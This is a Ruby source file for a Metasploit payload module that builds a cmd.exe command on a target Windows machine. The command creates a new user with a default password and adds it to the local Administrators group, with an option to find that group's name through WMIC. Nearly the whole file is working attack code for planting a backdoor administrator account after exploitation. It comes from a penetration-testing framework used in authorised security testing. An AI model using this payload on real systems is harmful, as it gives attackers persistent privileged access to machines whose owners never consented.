##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# Extends the Exec payload to add a new user.
#
###
module MetasploitModule
  CachedSize = 282

  include Msf::Payload::Windows::Exec

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Execute net user /ADD',
        'Description' => %q{
          Create a new user and add them to local administration group.

          Note: The specified password is checked for common complexity
          requirements to prevent the target machine rejecting the user
          for failing to meet policy requirements.

          Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)
        },
        'Author' => ['hdm', 'Chris John Riley'],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X86,
        'Privileged' => true
      )
    )

    # Register command execution options
    register_options(
      [
        OptString.new('USER', [ true, 'The username to create', 'metasploit' ]),
        OptString.new('PASS', [ true, 'The password for this user', 'Metasploit$1' ]),
        OptString.new('CUSTOM', [ false, 'Custom group name to be used instead of default', '' ]),
        OptBool.new('WMIC', [ true, 'Use WMIC on the target to resolve administrators group', false ]),
      ]
    )

    register_advanced_options(
      [
        OptBool.new('COMPLEXITY', [ true, 'Check password for complexity rules', true ]),
      ]
    )

    # Hide the CMD option...this is kinda ugly
    deregister_options('CMD')
  end

  #
  # Override the exec command string
  #
  def command_string
    user = datastore['USER'] || 'metasploit'
    pass = datastore['PASS'] || ''
    cust = datastore['CUSTOM'] || ''
    wmic = datastore['WMIC']
    complexity = datastore['COMPLEXITY']

    if (pass.length > 14)
      raise ArgumentError, 'Password for the adduser payload must be 14 characters or less'
    end

    if complexity && pass !~ (/\A^.*((?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\d\W])).*$/)
      raise ArgumentError, "Password: #{pass} doesn't meet complexity requirements and may cause issues"
    end

    if !cust.empty?
      print_status("Using custom group name #{cust}")
      return "cmd.exe /c net user #{user} #{pass} /ADD && " \
             "net localgroup \"#{cust}\" #{user} /ADD"
    elsif wmic
      print_status('Using WMIC to discover the administrative group name')
      return 'cmd.exe /c "FOR /F "usebackq tokens=2* skip=1 delims==" ' \
             "%G IN (`wmic group where sid^='S-1-5-32-544' get name /Value`); do " \
             'FOR /F "usebackq tokens=1 delims==" %X IN (`echo %G`); do ' \
             "net user #{user} #{pass} /ADD && " \
             "net localgroup \"%X\" #{user} /ADD\""
    else
      return "cmd.exe /c net user #{user} #{pass} /ADD && " \
             "net localgroup Administrators #{user} /ADD"
    end
  end
end
